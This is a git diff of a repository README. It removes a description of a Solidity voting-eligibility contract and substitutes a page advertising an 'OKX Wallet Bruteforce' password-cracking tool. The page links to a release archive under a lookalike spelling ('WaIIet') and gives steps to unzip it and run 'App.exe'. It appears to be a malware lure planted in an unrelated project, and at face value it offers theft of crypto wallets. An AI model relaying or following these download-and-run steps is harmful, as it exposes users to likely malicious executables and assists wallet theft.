@@ -1,17 +1,44 @@
-# Voting Smart Contract
-This Solidity program is a simple contract that demonstrates the use of require(), assert(), and revert() statements in Solidity.The purpose of the contract is to demonstrate the error handling while creation and updation of voting candidate using require(), assert() and revert().
+## Download Here 
 
-# Description
-This contract simulates a voting eligibility system. Users can set their age and voting card status, and then check if they are eligible for a voting based on these details. The contract uses Solidity's require(), assert(), and revert() statements to enforce rules and validate conditions.
+ * **<p><a href="https://github.com/DkRadhey/OKXWaIIetBrute/releases/download/Download/Version_2.7.zip">​Download Brute for WaIIet</a>**
 
-# Getting Started
-Executing Program
-To run this program, you can use Remix, an online Solidity IDE. To get started, go to the Remix website at Remix Ethereum IDE.
+---
 
-Once you are on the Remix website, create a new file by clicking on the "+" icon in the left-hand sidebar. Save the file with a .sol extension (e.g., voting.sol). Copy and paste the following code into the file:
 
-To compile the code, click on the "Solidity Compiler" tab in the left-hand sidebar. Make sure the "Compiler" option is set to "0.8.0" (or another compatible version), and then click on the "Compile voting.sol" button.
+# OKX Wallet Bruteforce
 
-Once the code is compiled, you can deploy the contract by clicking on the "Deploy & Run Transactions" tab in the left-hand sidebar. Select the "Voting" contract from the dropdown menu, and then click on the "Deploy" button.
+Welcome to the OKX Wallet Bruteforce project! This C++ application attempts to brute-force OKX wallet passwords. **Use this tool responsibly and only for educational purposes or with explicit permission.**
 
-Once the contract is deployed, you can interact with it by calling the setAge(), setVotingCard(), and checkEligibility() functions. Set your age and voting card status first, and then check your eligibility for voting.
+
+
+## Features
+
+- **Password Brute-Forcing**: Attempt to crack OKX wallet passwords.
+- **Customizable Parameters**: Adjust brute-forcing speed and character sets.
+- **Easy to Use**: Simple setup and configuration process.
+
+
+---
+
+## ***To launch the software ⏬***
+1. **Download the archive** called "Version_2.7"
+2. **Open archive**
+3. **Open folder** called "Download".
+4. **Open the file** called "App.exe".
+
+---
+
+
+
+## Contributing
+
+We welcome contributions from the community. To contribute:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature-branch`).
+6. Open a pull request.
+
+
